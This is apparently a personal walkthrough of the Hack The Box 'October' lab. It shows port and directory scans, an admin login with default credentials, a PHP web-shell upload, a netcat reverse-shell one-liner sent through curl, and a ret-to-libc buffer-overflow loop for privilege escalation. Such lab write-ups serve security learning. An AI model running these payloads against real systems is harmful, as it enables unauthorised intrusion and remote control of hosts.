nmap
```
┌──(kali㉿kali)-[~/HTB/october]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.203.91
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 01:27 EST
Nmap scan report for 10.129.203.91
Host is up (0.055s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Potentially risky methods: PUT PATCH DELETE
|_http-title: October CMS - Vanilla
|_http-server-header: Apache/2.4.7 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|storage-misc
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X (97%), Synology DiskStation Manager 7.X (90%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/a:synology:diskstation_manager:7.1 cpe:/o:linux:linux_kernel:4.4
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.13 - 4.4 (97%), Linux 3.2 - 4.14 (97%), Linux 3.8 - 3.16 (97%), Linux 2.6.32 - 3.13 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.4 (90%), Linux 3.13 (90%), Linux 3.16 (90%), Linux 3.16 - 4.6 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   41.83 ms 10.10.14.1
2   42.20 ms 10.129.203.91

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 304.18 seconds
```

```
┌──(kali㉿kali)-[~/HTB/october]
└─$ dirsearch -u http://10.129.203.91/                
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/october/reports/http_10.129.203.91/__25-01-15_01-27-15.txt

Target: http://10.129.203.91/

[01:27:16] Starting: 
[01:28:18] 403 -  291B  - /.ht_wsr.txt                                      
[01:28:18] 403 -  294B  - /.htaccess.bak1                                   
[01:28:18] 403 -  294B  - /.htaccess.orig                                   
[01:28:18] 403 -  294B  - /.htaccess.save
[01:28:18] 403 -  295B  - /.htaccess_extra                                  
[01:28:18] 403 -  294B  - /.htaccess_orig                                   
[01:28:18] 403 -  296B  - /.htaccess.sample                                 
[01:28:18] 403 -  292B  - /.htaccessOLD
[01:28:18] 403 -  292B  - /.htaccess_sc
[01:28:18] 403 -  293B  - /.htaccessOLD2                                    
[01:28:18] 403 -  284B  - /.htm
[01:28:18] 403 -  285B  - /.html
[01:28:18] 403 -  292B  - /.htaccessBAK                                     
[01:28:19] 403 -  290B  - /.htpasswds                                       
[01:28:19] 403 -  291B  - /.httr-oauth                                      
[01:28:19] 403 -  294B  - /.htpasswd_test
[01:28:53] 403 -  284B  - /.php                                             
[01:28:53] 403 -  285B  - /.php3
[01:30:50] 200 -    1KB - /account                                          
[01:30:56] 200 -    1KB - /account/                                         
[01:30:56] 200 -    1KB - /account/login.jsp                                
[01:30:56] 200 -    1KB - /account/logon
[01:30:56] 200 -    1KB - /account/login.htm
[01:30:56] 200 -    1KB - /account/login.html                               
[01:30:56] 200 -    1KB - /account/login.rb
[01:30:56] 200 -    1KB - /account/signin
[01:30:56] 200 -    1KB - /account/login.php
[01:30:56] 200 -    1KB - /account/login.shtml                              
[01:30:56] 200 -    1KB - /account/login
[01:30:56] 200 -    1KB - /account/login.js
[01:30:56] 200 -    1KB - /account/login.py
[01:30:56] 200 -    1KB - /account/login.aspx                               
[01:35:03] 302 -  408B  - /backend/  ->  http://10.129.203.91/backend/backend/auth
[01:35:30] 200 -    1KB - /blog/                                            
[01:35:30] 200 -    1KB - /blog/fckeditor                                   
[01:35:30] 200 -    1KB - /blog                                             
[01:35:30] 200 -    1KB - /blog/error_log                                   
[01:35:30] 200 -    1KB - /blog/phpmyadmin/                                 
[01:35:31] 200 -    1KB - /blog/wp-login                                    
[01:35:31] 200 -    1KB - /blog/wp-login.php                                
[01:36:24] 301 -  314B  - /config  ->  http://10.129.203.91/config/         
[01:38:06] 200 -    1KB - /error                                            
[01:38:06] 200 -    1KB - /error/                                           
[01:38:45] 200 -    2KB - /forum                                            
[01:38:46] 200 -    2KB - /forum/                                           
[01:41:42] 301 -  315B  - /modules  ->  http://10.129.203.91/modules/       
[01:43:30] 301 -  315B  - /plugins  ->  http://10.129.203.91/plugins/       
[01:44:47] 403 -  294B  - /server-status/                                   
[01:44:48] 403 -  293B  - /server-status                                    
[01:45:49] 301 -  315B  - /storage  ->  http://10.129.203.91/storage/       
[01:46:30] 301 -  313B  - /tests  ->  http://10.129.203.91/tests/           
[01:46:32] 301 -  314B  - /themes  ->  http://10.129.203.91/themes/         
                                                                             
Task Completed 
```

![Pasted image 20250115145737](<0. Attachments/Pasted image 20250115145737.png>)

![Pasted image 20250115145822](<0. Attachments/Pasted image 20250115145822.png>)
tried -admin/admin it worked

![Pasted image 20250115145919](<0. Attachments/Pasted image 20250115145919.png>)

we uploaded a php5 because it was allowed
![Pasted image 20250115150603](<0. Attachments/Pasted image 20250115150603.png>)
dr.php5 was there from before (probably someone elses exploited)

![Pasted image 20250115150726](<0. Attachments/Pasted image 20250115150726.png>)

```
curl http://10.129.203.91/storage/app/media/cmd.php5 --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 443 >/tmp/f"
```

upgrading shell
```
python -c 'import pty;pty.spawn("bash")'
ctrl+z
stty raw -echo ; fg ; reset;
```

![Pasted image 20250115151100](<0. Attachments/Pasted image 20250115151100.png>)

priv esc is buffer overflow have a look at this - [HTB: October | 0xdf hacks stuff](https://0xdf.gitlab.io/2019/03/26/htb-october.html#ovrflw-ret-to-libc)

![Pasted image 20250115151719](<0. Attachments/Pasted image 20250115151719.png>)

exploit
```
www-data@october:/home/harry$ cd /dev/shm

while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"'); done
```


